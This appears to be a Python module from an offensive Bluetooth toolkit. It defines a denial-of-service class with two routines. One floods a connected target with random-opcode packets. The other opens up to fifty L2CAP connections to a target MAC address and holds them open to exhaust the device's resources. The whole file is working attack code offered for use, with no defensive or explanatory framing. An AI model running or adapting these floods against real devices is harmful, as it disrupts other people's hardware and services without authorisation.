from core.connection import AAPConnection
from core.packet_builder import PacketBuilder
from rich.progress import track
import time
import random

class DoSModule:
    def __init__(self, connection: AAPConnection, console=None):
        self.connection = connection
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_flood(self, count=1000):
        self.log(f"[bold red][*] Starting Packet Flood ({count} packets)...[/bold red]")
        if not self.connection.sock:
            self.log("[red][!] Not connected.[/red]")
            return

        iterable = range(count)
        if self.console:
            iterable = track(range(count), description="[red]Flooding Target...[/red]", console=self.console)

        for i in iterable:
            try:
                opcode = random.randint(0, 0xFF)
                data = random.randbytes(4)
                
                pkt = PacketBuilder.build_packet(opcode, data)
                self.connection.send(pkt)
                
                if not self.console and i % 50 == 0:
                    print(f"[*] Sent {i} packets...")
                
                time.sleep(0.005)
            except Exception as e:
                self.log(f"[red][!] Error during flood at packet {i}: {e}[/red]")
                break
        
        self.log("[bold green][*] Flood complete.[/bold green]")

    def l2cap_flood(self, target_mac, max_conns=50):
        # Requires -t/--target to be specified

        self.log(f"[bold red][*] Starting L2CAP Resource Exhaustion against {target_mac}...[/bold red]")
        sockets = []
        import socket
        
        try:
            for i in range(max_conns):
                try:
                    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
                    s.settimeout(2)
                    s.connect((target_mac, 0x1001))
                    sockets.append(s)
                    self.log(f"[green][+] Connected socket #{i+1}[/green]")
                    time.sleep(0.1)
                except Exception as e:
                    self.log(f"[yellow][!] Connection limit reached or refusal at #{i+1}: {e}[/yellow]")
                    break
        except KeyboardInterrupt:
             self.log("\n[yellow][*] Stopping Flood...[/yellow]")
        
        self.log(f"[bold blue][*] Holding {len(sockets)} connections open... (Ctrl+C to release)[/bold blue]")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
            
        for s in sockets:
            s.close()
        self.log("[*] Released all connections.")
